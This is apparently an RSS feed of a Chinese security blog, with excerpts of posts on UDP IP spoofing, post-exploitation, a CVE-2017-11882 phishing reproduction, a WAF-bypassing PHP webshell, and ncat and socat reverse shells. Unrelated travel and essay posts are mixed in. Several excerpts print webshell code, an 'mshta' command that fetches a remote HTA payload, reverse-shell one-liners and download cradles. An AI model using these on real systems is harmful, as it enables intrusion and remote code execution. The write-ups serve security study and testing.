而 UDP 则不同，UDP 中不存在三次握手，那么发送端就只要发送数据即可，而接收端只要接收数据即可。所以，在 TCP 中不能对源 IP 地址进行伪造，而 UDP 中则可以。
UDP协议不需要握手，直接发送接收，下面我来通过小故事来形象的描述UDP中的伪造IP头攻击：
假设有三个用户，Allen、Jerry、Tom.
Jerry与Tom一次正常的UDP请求 Jerry说：“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”
此时Tom的4478端口接收到一个UDP报文，需要回复内容，回复给谁呢，接下来需要根据报文中的IP头确定是谁发送的
通过Jerry的话确定发送方是Jerry，而Jerry的端口是4787，那么Tom就会将数据传送给Jerry
Tom说：“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”
Allen进行一次RDOS攻击 Allen说：“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”
此时Tom接收到报文，根据上面这句话确定了发送人是Jerry，目的端口是4787
Tom说：“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”
这个过程当中，Jerry并没有参与通信，但是接到了一个从Tom那里发送过来的UDP数据报文
0x04 编写一个伪造IP头的C语言程序 /usr/include/netinet/ip.h
这里面定义了IP头
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 struct ip { #if __BYTE_ORDER == __LITTLE_ENDIAN unsigned int ip_hl:4;	/* header length */ unsigned int ip_v:4;	/* version */ #endif #if __BYTE_ORDER == __BIG_ENDIAN unsigned int ip_v:4;	/* version */ unsigned int ip_hl:4;	/* header length */ #endif uint8_t ip_tos;	/* type of service */ unsigned short ip_len;	/* total length */ unsigned short ip_id;	/* identification */ unsigned short ip_off;	/* fragment offset field */ #define	IP_RF 0x8000	/* reserved fragment flag */ #define	IP_DF 0x4000	/* dont fragment flag */ #define	IP_MF 0x2000	/* more fragments flag */ #define	IP_OFFMASK 0x1fff	/* mask for fragmenting bits */ uint8_t ip_ttl;	/* time to live */ uint8_t ip_p;	/* protocol */ unsigned short ip_sum;	/* checksum */ struct in_addr ip_src, ip_dst;	/* source and dest address */ }; /usr/include/netinet/udp.</description></item><item><title>针对某跨国企业的一次渗透测试-持续</title><link>https://payloads.online/archivers/2018-01-30/1/</link><pubDate>Tue, 30 Jan 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-01-30/1/</guid><description>&lt;p>文章涉及泄漏厂商隐私，已经删除！&lt;/p></description></item><item><title>我的丽江之旅</title><link>https://payloads.online/archivers/2018-01-22/1/</link><pubDate>Mon, 22 Jan 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-01-22/1/</guid><description>出发 第一天安排如下:
2018/01/17 早上06:30杭州大酒店集合出发,前往萧山机场。搭乘航班JD51（09:05-13:05）赴丽江，抵达历史文化名城—丽江，乘车前往丽江城区金府大饭店，古城内自由活动，晚自行返回酒店。
由于早上起来的比较早，大概是05:30就起来了，这时候杭州还没有天亮，早饭没有吃，本来想去商店里买一杯关东煮，但是 人家刚开始煮 ~ 就只能饿着肚子去机场了。
上了大巴后，一路上也是瞌睡的状态中度过，到达机场后，抽了一根烟就开始取票、安检、上洗手间，和同事玩了一会手游就开始登机了。
到达客栈 到达丽江机场后，导游开始带领我们上车，并且介绍了丽江的少数民族以及习俗，而且还是会开车的导游！ 哈哈哈
机场到达丽江古城大概有40多分钟，坐的大巴，路上会收身份证检查(查完归还)，因为现在旅游都实名制了。
到达客栈后，深深的被这里的古城风格吸引了，每个家具以及环境都别具民族特色，这是在2000多米海拔上的丽江古城
山山水水，世外桃源……
我住的房间门口，客栈一角，中间是有一个石桌石椅，我们晚上在这里打牌喝酒。
这里的餐厅，装修绝对不简单~ 每个做好的美食都放在保温箱里，防止食物散热，因为丽江在高原，昼夜温差比较大。
起来的比较晚哈哈，当然没啥好吃的了，就只能喝点粥和牛奶……
古城，你好 走在人少的古城小道，别具诗意，哈哈
还有随处可见的其他客栈，基本上都会在门口立着一个牌子 —— “今日有房”
如果这家客栈是在城市之中，恐怕路过的人都会拍几张，但是在丽江，这太普通了！
热情的少数民族，一对情侣，这里的人们对于爱情可是有着别样的看法，若两个人不能在一起、或者是结婚，那就选择殉情，去“玉龙第三国”，就在玉龙雪山脚下，我稍后会介绍
这里万里无云，墙壁上雕刻着这些民族独有的象形文字。
古城的美食街，我在这里吃了一碗米线，不如前面小店里的…… 可能是他们做惯了快餐 = =
密室逃脱都有，这里的商业发展很完善，支持微信、支付宝付款
美食 到了下午，饥饿感袭来，赶紧去寻找云南特色美食，米线当然是少不了的了。
我们选了一家比较大的米线店，虽然这种店随处可见，但是隐隐感觉这的味道绝对不差。
古城的夜晚狂欢 吃完饭就回去躺了一会，比较累就没有去逛
到了晚上，开始狂欢！ 公司组织了一个小活动，去酒吧喝酒 —— “水泊梁山”
晚上人比较多，开着导航都容易走错，小道大道错综复杂。
在这里有一种“午夜销魂酒”，我喝了不少，还有“飞花雪月”~~ 手中拿着酒壶，就像是古代里的侠客 ~ 哈哈
最后的最后我还是喝多了，回到客栈就吐了 2333 然后躺倒，一觉睡到第二天早上
最美老板娘 第一晚跟着同事去看了这个抖音网红
她是卖民鼓的，演奏的很好听~
登上玉龙雪山的前奏 玉龙雪山为云南省丽江市境内雪山群，地处东经100°4′2″～100°16′30″、北纬27°3′2″～27°18′57″之间，在丽江北面约15千米处，全长75千米，是北半球最近赤道终年积雪的山脉，隔江西与中甸雪山、东与绵绵山相并列，北自三江口，向南延伸到北纬27°，如扇面向古城展开。全山的13座山峰由南向北纵向排列，主峰扇子陡最高处海拔5596米，终年积雪，发育有亚欧大陆距离赤道最近的温带海洋性冰川。
早上很早就起来了，因为索道需要排队，我们排到了中午，天气很好。
坐车去玉龙雪山脚下。
由于玉龙雪山海拔比较高，高到穿透了云层，登山的时候氧气稀薄，必须购买一个氧气罐，补充氧气，一罐大概60元。
PS:购买氧气罐必须要去专业的供氧中心，以防买到“压缩空气”
到达玉龙雪山脚下
云雾缭绕的上面就是玉龙雪山、路上导游也介绍了玉龙雪山相关的景色以及乘坐索道的注意事项，还有玉龙雪山的特色（国家保护动物、植物、药材）
进入玉龙雪山需要乘坐一段时间大巴车，到达乘坐索道的地点，首先需要安检、刷身份证来验票，整个旅游的景点都是只需要刷身份证就可以了，非常方便。
下车后看到路边有一些积雪、气温开始下降，大家去的话一定要带厚衣服。
开始排队、进行索道安检，期间看到索道上的缆车通过钢缆送上云端，不经感叹人类的智慧力量，那可是5000多米的海拔，通过电力就可以把人送上去。
在过了安检后，我路过了一个展览牌，里面标识了每一个海拔点。
通过缆车将人送到4506米的海拔高度，然后再通过楼梯，爬上4680的海拔高度。我一开始是想登上5596米的，但是只能上到4680&amp;hellip;. 后面你会看到我的狼狈、怎么说也是年轻的小伙，爬一百多米就不行了。
缆车开始驶离起点，直冲云霄~
在缆车上可以看到山上的植被，好像大多是松树，还有常年不化的积雪。
开始冲破云层
天上的景色 着陆后 下了缆车，看到许多人，然后我的嘴唇开始泛白、头有点晕，感觉开始吸氧，向楼梯走去，绝对不能倒在起点啊 哈哈</description></item><item><title>针对国内一大厂的后渗透 - 持续</title><link>https://payloads.online/archivers/2017-12-28/1/</link><pubDate>Thu, 28 Dec 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-12-28/1/</guid><description>0x00 前言 此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。
0x01 信息搜集 - 后渗透 首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell
这里我挑选了一个某厂边缘处的一个测试环境，在这之前我做了大量的信息搜集，没有选择直接去挖掘、利用漏洞
操作系统 Web服务器版本 PHP版本 绝对路径 子域名 开放端口 - 发现开启了防火墙 扫描到它存在phpMyadmin，弱口令登录进入，通过常规手法SQL写入shell。
1 SELECT &amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39; INTO OUTFILE &amp;#39;D:/WWW/***/master/&amp;#39;; 通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。
1 2 3 4 5 6 D:\WWW\***\master\&amp;gt; net user /domain 这项请求将在域 WORKGROUP 的域控制器处理。 发生系统错误 1355。 指定的域不存在，或无法联系。 通过上面的结果可以看到该服务器并不是域成员
1 2 D:\WWW\***\master\&amp;gt; query user * 没有用户 没有管理员在线
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 D:\WWW\***\master\&amp;gt; netstat -ano 活动连接 协议 本地地址 外部地址 状态 PID TCP 0.</description></item><item><title>CVE-2017-11882钓鱼攻击</title><link>https://payloads.online/archivers/2017-11-22/1/</link><pubDate>Wed, 22 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-22/1/</guid><description>0x00 前言 此次攻击使用了小组师傅改写的CVE利用脚本，能够将内容自定义，大大增加了小鱼上钩的可能。
0x01 环境简介 阿里云ECS服务器（Ubuntu） - 118.**.**.77 CVE-2017-11882.py 用于包装rtf msf &amp;amp;&amp;amp; CVE-2017-11882.rb CVE-2017-11882.rb内容如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 ## # This module requires Metasploit: https://metasploit.</description></item><item><title>CVE-2017-11882漏洞复现</title><link>https://payloads.online/archivers/2017-11-21/1/</link><pubDate>Tue, 21 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-21/1/</guid><description>0x00 前言 参考backlion师傅的PDF，记录一下这个过程。
2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。
漏洞影响版本： Office 365 Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016 0x01 环境清单 WindowsServer 2008 (192.168.3.114) Office 2007 MAC OSX(192.168.3.106) 0X02 复现过程 使用Cobalt Strike生成hta反弹shell 将生成的hta文档放入WebServer根目录：http://192.168.3.106/evil.hta
我(Cobalt Strike)本地监听了一个8081端口，用来接收客户端的Shell
生成一个rtf/doc文档 github上已有生成脚本
webdav_exec_CVE-2017-11882.py 地址： http://payloads.online/tools/cve-2017-11882/webdav_exec_CVE-2017-11882.py
生成rtf文档：
1 2 python webdav_exec_CVE-2017-11882.py -u http://192.168.3.106/evil.hta -e &amp;#34;mshta http://192.168.3.106/evil.hta&amp;#34; -o test.rtf !!! Completed !</description></item><item><title>CTF - 美眉的手机号</title><link>https://payloads.online/archivers/2017-11-14/1/</link><pubDate>Tue, 14 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-14/1/</guid><description>0x00 前言 十一月十一号，在北科大参加了一场CTF，也是第一次投身真正的比赛
个人感觉，CTF并不是一种学习方式，但是绝对可以考验你的技术深度，这次去北京，确实感受到了那种极客精神，不管题目难或易，都有可圈可点之处，我将他们看作一道道关卡，将自己掌握的知识不断融合，去开辟新的思路，我很享受这个过程，其中，主要做了两道比较深刻的题目，在这里拿出来与大家分享，由于当时场地不允许连接外网，不能查阅资料，更获取不到服务器上的题目源代码，我只能回忆题目中的逻辑，通过PHP将它实现，略有改动。
我自己还原的源代码可以在这里看到：https://github.com/Rvn0xsy/ctf_get_phone
0x01 题目 大概意思是拿到管理员的手机号码，这个手机号码是flag。
你能获得女神的手机号吗？ 就在这里，存在一个高危漏洞，并且使用工具是无法达到目的的，追女神还是要用真心呀！！
0x02 细节分析 我首先使用自己手中的字典进行了一轮爆破，爆破的同时去注册了两个账号。
注册需要提供：
| username | password | phone |
这时，爆破未果，既然是一个高危漏洞，概率不会依附在“弱口令”上 （安慰一下自己）。
注册的两个账号，第一个是用于正常查看，第二个放入一些让SQL语句报错的关键字，例如：“ &amp;rsquo; 、* 、) ”
但是第一个注册成功了，第二个提示phone必须是数字，这个提示信息是由客户端脚本提示的
于是我猜想会不会服务器端没有验证呢？
使用Burp提交后还是失败 :(
先不管这个，第一步就要把所有的信息搜集完毕再说。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $(&amp;#34;#register&amp;#34;).bind(&amp;#39;click&amp;#39;,function(){ var usernameObj = $(&amp;#34;#username&amp;#34;); var passwordObj = $(&amp;#34;#password&amp;#34;); var phoneObj = $(&amp;#34;#phone&amp;#34;); var usernameVal = usernameObj.</description></item><item><title>socat 使用手册</title><link>https://payloads.online/tools/socat/</link><pubDate>Thu, 09 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/tools/socat/</guid><description>socat简介 socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版，socat的官方网站：http://www.dest-unreach.org/socat/ 。
Socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、socket（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。
Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。
socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。
socat的安装 网络安装： Debian/Ubuntu:apt-get install socat
Mac OSX:brew install socat
ps:Kali linux 里已经集成了此工具
下载软件包 下载socat源代码包：http://www.dest-unreach.org/socat/download/
编译安装 把下载的软件包解压后按照传统的方式编译安装：
1 2 3 ./configure make make install 具体的细节可以参考安装文档 README 。
安装错误解决 在编译的过程中可能遇到如下错误：
解决方法有两种：
第一种是禁用fips，使用如下命令配置： ./configure --disable-fips
第二种是安装fips 首先到网站http://www.openssl.org/source/ 下载openssl-fips安装包，然后解压安装：
1 2 3 ./config make make install socat的使用 socat的具体文档参见网站：http://www.dest-unreach.org/socat/doc/socat.html 。
工作机理 socat的运行有4个阶段:
初始化 解析命令行以及初始化日志系统。
打开连接 先打开第一个连接，再打开第二个连接。这个单步执行的。 如果第一个连接失败，则会直接退出。</description></item><item><title>Windows下命令行下载文件总结</title><link>https://payloads.online/archivers/2017-11-08/1/</link><pubDate>Wed, 08 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-08/1/</guid><description>0x00 Powershell win2003、winXP不支持
$client = new-object System.Net.WebClient
$client.DownloadFile(&amp;lsquo;http://payloads.online/file.tar.gz', &amp;lsquo;E:\file.tar.gz&amp;rsquo;)
0x01 ftp ftp 192.168.3.2
输入用户名和密码后
lcd E:\file # 进入E盘下的file目录
cd www # 进入服务器上的www目录
get access.log # 将服务器上的access.log下载到E:\file
可以参考：https://baike.baidu.com/item/ftp/13839
0x02 IPC$ copy \192.168.3.1\c$\test.exe E:\file
可以参考：http://www.163164.com/jiqiao/163164com011.htm
0x03 Certutil 可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx
应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt
0x04 bitsadmin 可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx
1、bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt 2、bitsadmin /rawreturn /transfer getpayload http://192.</description></item><item><title>Tomcat 开启 https支持</title><link>https://payloads.online/archivers/2017-08-21/1/</link><pubDate>Mon, 21 Aug 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-08-21/1/</guid><description>0x00 配置keystore 要使用ssl connector，必须先创建一个keystore。他包含了服务器中被客户端用于验证服务器的数字证书。一旦客户端接受了这个证书，客户端就可以使用public key去加密他们要发送的数据。而服务器，拥有一个private key，作为唯一解密数据的密钥。
进入JDK环境的bin目录，调用keytool来完成我们的证书生成：
keytool -genkey -alias tomcat -keyalg RSA
-genkey:创建一个public-private key pair -alias tomcat：用户别名为tomcat -keyalg RSA： 使用RSA算法。 MD5算法也是被支持的，但是建议使用RSA获得更好的兼容。 生成证书后，此证书会被保存在当前用户主目录下。
0x01 修改配置文件 找到tomcat目录下的conf/server.xml，将原来的Connector 更改一下即可。
1 2 3 4 5 6 7 8 9 &amp;lt;!-- &amp;lt;Connector port=&amp;#34;8443&amp;#34; protocol=&amp;#34;HTTP/1.1&amp;#34; SSLEnabled=&amp;#34;true&amp;#34; maxThreads=&amp;#34;150&amp;#34; scheme=&amp;#34;https&amp;#34; secure=&amp;#34;true&amp;#34; clientAuth=&amp;#34;false&amp;#34; sslProtocol=&amp;#34;TLS&amp;#34; /&amp;gt; --&amp;gt; 改成：
1 2 3 4 5 &amp;lt;Connector port=&amp;#34;端口&amp;#34; protocol=&amp;#34;org.apache.coyote.http11.Http11Protocol&amp;#34; maxThreads=&amp;#34;150&amp;#34; SSLEnabled=&amp;#34;true&amp;#34; scheme=&amp;#34;https&amp;#34; secure=&amp;#34;true&amp;#34; clientAuth=&amp;#34;false&amp;#34; sslProtocol=&amp;#34;TLS&amp;#34; keystoreFile=&amp;#34;keystore文件路径&amp;#34; keystorePass=&amp;#34;口令&amp;#34; /&amp;gt; 重启tomcat后生效~</description></item><item><title>记一次某Cms的审计</title><link>https://payloads.online/archivers/2017-08-18/1/</link><pubDate>Fri, 18 Aug 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-08-18/1/</guid><description>0x00 前言 此套cms采用了CI框架，之前在做漏洞平台的时候也是用的这个框架开发。
CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。
文章写的比较急，以后再补充……
0x01 第一弹 安装程序Getshell 首先我们一般都是在安装的时候，看看有没有重装的可能性，粗略的看了一下代码并没有，但是存在一个有趣的安装getshell问题。
CI框架的数据库配置在：config\database.php,其常见内容如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 &amp;lt;?php if (!defined(&amp;#39;BASEPATH&amp;#39;)) exit(&amp;#39;No direct script access allowed&amp;#39;); $active_group = &amp;#39;default&amp;#39;; $query_builder = TRUE; $db[&amp;#39;default&amp;#39;] = array( &amp;#39;dsn&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;hostname&amp;#39; =&amp;gt; &amp;#39;localhost&amp;#39;, &amp;#39;username&amp;#39; =&amp;gt; &amp;#39;root&amp;#39;, &amp;#39;password&amp;#39; =&amp;gt; &amp;#39;root&amp;#39;, &amp;#39;port&amp;#39; =&amp;gt; &amp;#39;3306&amp;#39;, &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;xxxxx&amp;#39;, &amp;#39;dbdriver&amp;#39; =&amp;gt; &amp;#39;mysqli&amp;#39;, &amp;#39;dbprefix&amp;#39; =&amp;gt; &amp;#39;dr_&amp;#39;, &amp;#39;pconnect&amp;#39; =&amp;gt; FALSE, &amp;#39;db_debug&amp;#39; =&amp;gt; true, &amp;#39;cache_on&amp;#39; =&amp;gt; FALSE, &amp;#39;cachedir&amp;#39; =&amp;gt; &amp;#39;cache/sql/&amp;#39;, &amp;#39;char_set&amp;#39; =&amp;gt; &amp;#39;utf8&amp;#39;, &amp;#39;dbcollat&amp;#39; =&amp;gt; &amp;#39;utf8_general_ci&amp;#39;, &amp;#39;swap_pre&amp;#39; =&amp;gt; &amp;#39;&amp;#39;, &amp;#39;autoinit&amp;#39; =&amp;gt; FALSE, &amp;#39;encrypt&amp;#39; =&amp;gt; FALSE, &amp;#39;compress&amp;#39; =&amp;gt; FALSE, &amp;#39;stricton&amp;#39; =&amp;gt; FALSE, &amp;#39;failover&amp;#39; =&amp;gt; array(), ); 安装界面： 然后找到这个界面对应的代码 diy\dayrui\controllers\Install.</description></item><item><title>Nmap扩展开发</title><link>https://payloads.online/archivers/2017-08-07/1/</link><pubDate>Mon, 07 Aug 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-08-07/1/</guid><description>0x00 资产扫描、汇总、实时监控 资产扫描能够有利于企业内部查看终端、监控终端、对终端进行安全加固。周期性的扫描能有效快速修补漏洞、降低办公网络风险。
如何进行汇总、实时监控？ 在我们要进行汇总的时候，有如下几个可以考虑的方案。
PDF Excel Text Database / SQL PDF &amp;amp;&amp;amp; Excel &amp;amp;&amp;amp; Text 都不适合实时View
Database / SQL 有利于生成数据汇总、图表，并且可移植性很高。
Database -&amp;gt; Web -&amp;gt; Excel/PDF &amp;hellip;. 可行性都变得高了起来
实时监控采用任务调度，数据库采用IO效率高的NO SQL产品，详细信息采用普通的数据库：MySQL、SQL Server、Oracel&amp;hellip;
0X01 解决方案 Nmap简介、目录结构、扫描流程、Nse Engine 0X02 简介 Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。
目录结构 扫描流程 V1 扫描流程 V2 Nse Engine（Nmap 脚本引擎） Nmap Nse 脚本引擎用于针对发现的OS、主机、端口进行不同的操作，例如：Fuzz测试、漏洞发现、漏洞利用等。这对Nmap又增添了一大亮点，所以说Nmap不只是一个扫描工具，在黑客的手中，更是一款爱不释手的渗透工具。
Nse Engine的执行流程 0X03 一个简单的扩展打开世界 https://nmap.org/book/nse-api.html
Nmap扩展主要由以下几个变量构成。编码方式：变量绑定函数
顺序为：Prerule -&amp;gt; Hostrule or Portrule -&amp;gt; Action -&amp;gt; Postrule</description></item><item><title>端口转发工具小结</title><link>https://payloads.online/archivers/2017-07-31/1/</link><pubDate>Mon, 31 Jul 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-07-31/1/</guid><description>0X00 ncat 反弹shell 服务器：ncat -lnv -c bash 4489 将bash转发到4489端口
客户端：ncat -nv 172.17.0.1 4489 连接到目标的4489即可获得交互式bash
Windows下用 -c C:\windows\system32\cmd.exe
参数介绍：
|-l,--listen &amp;lt;port&amp;gt; | 监听某个端口 | -n, --nodns　|不通过DNS解析主机名 | -v,--verbose |设置的详细程度(可以使用几次) | -c,--sh-exec | 执行传递的命令行
建立聊天室 服务端：ncat -lnv --broker --chat 8432
客户端：ncat -nv 172.17.0.1 8432
参数介绍：
| --broker | 使用ncat的代理连接模式，允许多个组织连接到ncat的服务器和其他人交流，ncat能创建一个经纪人在连接和系统之间通过NAT或者其他的直接连接。这个选项是和监听模式一起使用的。这会使监听端口的经纪人模式启动 | --chat |　开启一个简单的ncat聊天服务器
采用SSL加密 服务器：ncat -lnv -c bash 4489 --ssl 客户端：ncat -nv 172.17.0.1 4489 --ssl 传输文件 服务端：
1 2 3 4 5 6 root@Kali:~$ ncat -lnv 1788 &amp;gt; tmp.</description></item><item><title>光阴是酒，醉了来人</title><link>https://payloads.online/archivers/2017-06-08/2/</link><pubDate>Thu, 08 Jun 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-06-08/2/</guid><description>季节一茬茬地来了又去了，像人，一批批地走来，又一批批地融化。时间的水，冲刷春夏秋冬，阳春白雪，也让许多人的影子沉溺消逝。尽管寒来暑往是一种经难，而人，也还是在出世入世间醉了自己，醉了时空。
是谁把光阴酿成了甘醇，一滴酒里就论了乾坤。点点清亮的水液，容纳了大唐的雄风，装进了汉王的豪气。究竟是时光醉了人，还是人醉了时光。
日子不等人，不管你是柴禾背夫，还是皇室王子，气数的极限就等候在眼前，无论你看见还是看见，抑或装作没看见，它都有足够的耐心蹲守在那里。孟婆碗里的汤，从不分高贵与贫贱，人生命的季节末端，总有奈何桥上大一统的公平与平等。
那是一座怎样美妙的彩虹桥啊！谁走在上面，都是天堂的等待。因为这里废弃了等级观念，人人都是光阴酒缸里的裸浴者。王冠和草帽一样的散香，赤裸的身躯同样的云中飞，雾中驰。
在世上，人人都想活出个光彩照人，个个都拼出老命也要把红尘间的锦囊扑抓。本想优雅转身时，却撞上了华丽的黑暗。
时光把四季熏得年年旋，月月转，怎么也跨不出春花秋果的轮回圈。人是日子的背包，让年月一遍遍地装入，随着岁数的递增，包底的沉重一次次地拖压，终成漏兜的一个滴落。
小时候，总盼望着花儿快快的开，把轻快的脚步向往成光阴里的一枚枚敬拜。于是，对着月下星空，遥想长大后的种种美好。那时，一秒钟的憧憬，就温暖了几个世纪的来生。
日落日升不醉人，人自醉。一落入尘埃，黎明的第一缕曙光，就是一坛迷人的酒，你饮与不饮，由不得心的首造。
时辰很慈悲，从不索求什么。只要人一落世，对谁都平等相待。
锦上添花是人的本性嗜好，在苦难中挣扎的生命需要手的救援，但常常碰到的是袖手旁观的姿势。黑色的脚印墨化了人性的良善，而狼性的生吞活剥在人世得到了最大程度的释放。生存中，人学会了残暴，冷酷，狞笑，势利，三五九等成为惯常的衡量思维，祭祀的飘带上，有神的遗嘱在猎猎飞扬。
人时常赞美大自然的公正，岂不知，自然界是一个最没有情商的怪物，它和政治的心律一样，只跳荡在适者生存的理念上。一条生物链，把弱肉强食的经转念到了地老天荒。
一代豪杰，总想活出个千年黑，万年白，炼丹炉里的熊熊火光，忽闪出嘲讽的烈焰，映红了永世不泯的野心。世事不会有尽头，而人总想扒住时光的岩石，做一朵永不凋谢的石茶花。
宇宙间，除了时间是不可争论的公平君子外，一切皆是虚晃的游戏。所有主义的，只能代表政治的某种主张，不能代替文化。政治的潜规则，是人玩出来的。文化是酿酒师，把人酿成了哲学。
易经，是物质运行轨迹的学说；佛学，是因果的学说。人神共舞，这个世界因此精彩无限。在世上，人人都想当主角，生活中，实则大部分都只能是配角。
芸芸众生是现实的本来面目，众多星星里一盘月亮才是合乎天规的所在。人想通了，则一通百通。闷头曳犁的牛，常常会在收割的季节里咀嚼出生命最本真的滋味。
一枚草叶的清香，就到达了幸福的彼岸。
境界是文化的酒香，悲剧是历史的命题。回光返照让一个时代疯狂得烫手，谁在持念一把剑的血刃上，玷污了一个民族的良知。
等候的灯盏照不出人前行后尘的路，官僚阶级的产生，让众生瞠目结舌。于是，畸形的意识腐蚀了经世的流年。世界不变的规律就是不停地在变，海不会枯，石不会烂，只有人的誓言才会在利己的环境下溃散如沙。
在排除异己，消除后患的现实面前，翻寻先人业力里的残忍，使人返祖的记忆呈现一派黑色瑰丽，亮了自己的眼，暗了神坛上的的灯。
尘垢在肉身上结成了一件厚厚的外衣，人活不出自我，就被沉重的衣服拖向黑夜的深渊里。思想的灾难导致凡俗间的不了情，为求得一地生存，早已忘却了天堂和地狱两扇迥异的门。
斟一杯时光的酒，你来我往的路上，皆是醉汉，踉跄的身影，婀娜的梦想，飘逸出岁月的醇香。
尘世一缘，相遇相逢，你在我的眼里，我在你的眸上，光阴的酒豪迈了来者的醉意，盘腿一坐，便嗅出了年轮的禅味……</description></item><item><title>Cknife Bypass WAF</title><link>https://payloads.online/archivers/2017-06-05/1/</link><pubDate>Mon, 05 Jun 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-06-05/1/</guid><description>0x00 前言 这篇文章之前写过，由于博客关闭，重写一遍。
由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本博主不为此承担任何责任。
主要思路就是讲工具传输的内容加密，绕过WAF的匹配。
所需要的环境：
Windows Server 2003 Safe dog 4.0 正式版 CKnife 1.0 Release BurpSuite 1.6 ByPass 一句话木马一枚 Bypass Shell 具体可以点击这里寻找：Bypass Shell
Shell Code 如下：
1 2 3 4 5 6 7 8 &amp;lt;?php $___Ss = chr((97 ^ 1)+1); //[a] $___Ss .=chr((115 ^ 1)+1); //[s] $___Ss .=chr((115 ^ 1)+1); //[s] $___Ss .=chr((101 ^ 1)+1); //[e] $___Ss .=chr((114 ^ 0)); //[r] $___Ss .=chr((116 ^ 0)); //[t] $___Ss($_POST[&amp;#39;username&amp;#39;]); 0x01 普通传输模式分析 首先我们在WAF开启的情况下直接连接：</description></item><item><title>Struts S2-045 Nmap扫描脚本</title><link>https://payloads.online/archivers/nmap-write-script/</link><pubDate>Fri, 02 Jun 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/nmap-write-script/</guid><description>0x00 Nmap脚本简介 夜无眠，看了一下Nmap官方的英文API文档(全是English)，瞬间心态崩塌，不想吐槽它们的nmap官网前端太丑了=。=，但是都是大牛啊，挺敬佩开源开发者的。
